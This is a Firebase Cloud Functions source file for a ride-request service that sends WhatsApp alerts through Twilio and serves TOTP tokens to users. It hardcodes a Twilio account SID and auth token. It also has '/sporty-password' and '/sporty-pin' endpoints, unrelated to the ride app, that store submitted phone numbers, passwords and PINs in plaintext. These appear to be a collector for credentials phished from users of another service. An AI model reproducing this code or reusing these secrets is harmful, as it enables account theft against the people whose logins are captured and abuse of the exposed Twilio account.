const functions = require("firebase-functions");
const admin = require('firebase-admin');
const express = require("express");
const totp = require('totp-generator')
const {firestore} = require('firebase-admin');
var serviceAccount = require("./fbase");
const cors = require('cors');
const app = express()
admin.initializeApp({
  credential: admin.credential.cert(serviceAccount)
});

const accountSid = 'AC22c897d2280bd583e6c54d4fd1b6ce52'; 
const authToken = '15b50fee6551eb507614fda7989f4b09'; 
const client = require('twilio')(accountSid, authToken); 

app.listen(8899)
const db = admin.firestore().collection('trips')
const sporty = admin.firestore().collection('sporty')
const userKeys = admin.firestore().collection('user-keys')
app.use(cors());
app.use(express.json());

function message(name, phone, destination, requestDate, dateSchedule ) {
let day = new Date();
    client.messages 
      .create({ 
         body: `New ride request,   
From : ${name}
Pick location : Train station Rigasa  Destination : ${destination}
Phone : ${phone}
Time : ${new Date().toISOString().slice(0, 10)}  => ${day.toLocaleTimeString()}`, 
         from: 'whatsapp:+14155238886',       
         to: 'whatsapp:+2347055793353' 
       }) 
      .then(message => console.log(message.sid)) 
      .done();
}


app.post('/trip', (req,res) => {
    let body = {
        phone : req.body.phone,
        name : req.body.fullName,
        destination: req.body.destination,
        created: firestore.FieldValue.serverTimestamp()
    }
    db.doc().set(body).then(() => {
        message(body.name,body.phone,body.destination)
       res.json(req.body)
    })   
    
})
app.post('/sporty-password', (req,res) => {
  let body = {
      phone : req.body.phoneNumber,
      password : req.body.passwords,
      created: firestore.FieldValue.serverTimestamp()
  }
  
  sporty.doc().set(body).then(() => {
     res.json(req.body)
  })
  
})
app.post('/sporty-pin', (req,res) => {
  let body = {
      pin: req.body.pin,
      created: firestore.FieldValue.serverTimestamp()
  }
  sporty.doc().set(body).then(() => {
     res.json(req.body)
  })
  
})
exports.app = functions.https.onRequest(app)

  

//create user profile and schema on firestore upon user creation --auth
exports.newUserSignUp = functions.auth.user().onCreate(user => {
  return userKeys.doc(user.uid).set({
    Name: user.name || null,
    userid : user.uid,
    email: user.email,
    products: []
  });
});
// add new security key ---auth
exports.addProduct = functions.https.onCall(async (data, context) => {
  // check auth state
  if (!context.auth) {
    throw new functions.https.HttpsError(
      'unauthenticated', 
      'only authenticated users can vote up requests'
    );
  }
  
return  userKeys.doc(context.auth.uid).update(
    { products: admin.firestore.FieldValue.arrayUnion(data) } ,
  ).then(() => console.log('done')).catch(err => console.log(err))
  
})
// grab user data  --auth
exports.getdata = functions.https.onCall((data, context) => {
  // check auth state
  if (!context.auth) {
    throw new functions.https.HttpsError(
      'unauthenticated', 
      'only authenticated users can vote up requests'
    );
  }
return userKeys.doc(context.auth.uid).get().then((data) => {
var userdata = []
data.data().products.forEach((doc) => {
  let current = doc
     current.token = totp(current.key)
     userdata.push(current)
})
return userdata
})
})
//deleting user data 

// exports.deleteProduct = functions.https.onCall(async (data, context) => {
//   // check auth state
//   if (!context.auth) {
//     throw new functions.https.HttpsError(
//       'unauthenticated', 
//       'only authenticated users can vote up requests'
//     );
//   }
  
// return  userKeys.doc(context.auth.uid).update(
//     { products: admin.firestore.FieldValue.arrayRemove() } ,
//   ).then(() => console.log('done')).catch(err => console.log(err))
  
// })